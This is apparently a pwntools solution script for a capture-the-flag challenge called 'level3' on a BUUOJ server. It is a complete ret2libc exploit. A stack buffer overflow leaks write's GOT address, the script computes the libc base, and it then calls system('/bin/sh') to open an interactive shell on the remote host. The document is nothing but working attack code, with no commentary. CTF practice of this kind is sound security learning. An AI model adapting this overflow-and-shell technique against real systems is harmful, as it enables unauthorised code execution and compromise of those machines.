from pwn import *

context.log_level = 'debug'
# io = process('level3')
io = remote('node4.buuoj.cn', 26054)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('level3')
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

payload = cyclic(0x8C) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.sendline(payload)
io.recvline()
libc_base = u32(io.recvn(4)) - libc.symbols['write']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x8C) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)
io.sendline(payload)
io.interactive()

